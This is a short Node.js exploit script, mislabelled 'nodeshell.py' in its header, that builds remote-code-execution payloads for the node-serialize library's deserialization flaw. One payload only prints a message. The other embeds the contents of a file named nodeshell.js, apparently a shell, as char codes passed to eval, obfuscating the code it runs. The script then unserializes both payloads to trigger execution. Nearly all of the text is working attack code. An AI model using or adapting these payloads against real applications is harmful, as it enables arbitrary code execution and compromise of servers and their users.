// nodeshell.py by Celestial

const fs = require("fs");
const ser = require("node-serialize");
var src = fs.readFileSync("nodeshell.js").toString();
var sploit2 = `{"rce":"_$$ND_FUNC$$_function (){console.log('sploiting!');}()"}`;
var sploit = `{"rce":"_$$ND_FUNC$$_function (){console.log('sploiting....');eval(String.fromCharCode(${src.split("").map(c=>c.charCodeAt(0))}))}()"}`;
console.log();
console.log(sploit);
console.log();
console.log(sploit2);
var c = ser.unserialize(sploit2);
var c2 = ser.unserialize(sploit);

